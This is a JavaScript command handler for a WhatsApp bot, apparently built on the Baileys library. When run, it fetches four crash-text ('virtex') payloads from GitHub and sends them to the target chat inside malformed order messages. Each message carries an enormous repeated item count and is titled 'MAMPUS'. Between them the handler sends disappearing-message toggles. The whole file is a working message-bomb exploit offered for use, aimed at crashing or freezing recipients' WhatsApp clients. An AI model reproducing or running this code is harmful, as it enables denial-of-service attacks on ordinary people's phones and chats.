let linkRegex = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i
let handler = async (m, { conn, text, args }) => {
target = m.chat
conn.relayWAMessage(global.mm=conn.
prepareMessageFromContent(target, conn.
prepareDisappearingMessageSettingContent(0),
{}),{waitForAck:!0}).catch(console.log);                       
virtex = await require('node-fetch')('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/1.txt').then(v => v.text());
virtex2 = await require('node-fetch')('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/2.txt').then(v => v.text());
virtex3 = await require('node-fetch')('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/3.txt').then(v => v.text());
virtex4 = await require('node-fetch')('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/4.txt').then(v => v.text());
yahaha = await conn.prepareMessageFromContent(target, {
orderMessage: {
itemCount: "99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999".repeat(9999), // Bug
status: "INQUIRY",
surface: "CATALOG",
message: virtex,
orderTitle: 'MAMPUS', 
sellerJid: '0@s.whatsapp.net' 
}}, {});
keren = await conn.prepareMessageFromContent(target, {
orderMessage: {
itemCount: "99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999".repeat(9999), // Bug
status: "INQUIRY",
surface: "CATALOG",
message: virtex2,
orderTitle: 'MAMPUS', 
sellerJid: '0@s.whatsapp.net' 
}}, {});
wow = await conn.prepareMessageFromContent(target, {
orderMessage: {
itemCount: "99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999".repeat(9999), // Bug
status: "INQUIRY",
surface: "CATALOG",
message: virtex3,
orderTitle: 'MAMPUS', 
sellerJid: '0@s.whatsapp.net' 
}}, {});
hayyuk = await conn.prepareMessageFromContent(target, {
orderMessage: {
itemCount: "99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999".repeat(9999), // Bug
status: "INQUIRY",
surface: "CATALOG",
message: virtex4,
orderTitle: 'MAMPUS', 
sellerJid: '0@s.whatsapp.net' 
}}, {});
conn.relayWAMessage(yahaha);
conn.relayWAMessage(global.mm=conn.
prepareMessageFromContent(target, conn.
prepareDisappearingMessageSettingContent(0),
{}),{waitForAck:!0}).catch(console.log);                       
conn.relayWAMessage(keren);
conn.relayWAMessage(global.mm=conn.
prepareMessageFromContent(target, conn.
prepareDisappearingMessageSettingContent(0),
{}),{waitForAck:!0}).catch(console.log);                       
conn.relayWAMessage(wow);
conn.relayWAMessage(global.mm=conn.
prepareMessageFromContent(target, conn.
prepareDisappearingMessageSettingContent(0),
{}),{waitForAck:!0}).catch(console.log);                        
conn.relayWAMessage(hayyuk);
conn.relayWAMessage(global.mm=conn.
prepareMessageFromContent(target, conn.
prepareDisappearingMessageSettingContent(0),
{}),{waitForAck:!0}).catch(console.log);                        
}
handler.command = /^binario1$/i
handler.rowner = true
module.exports = handler
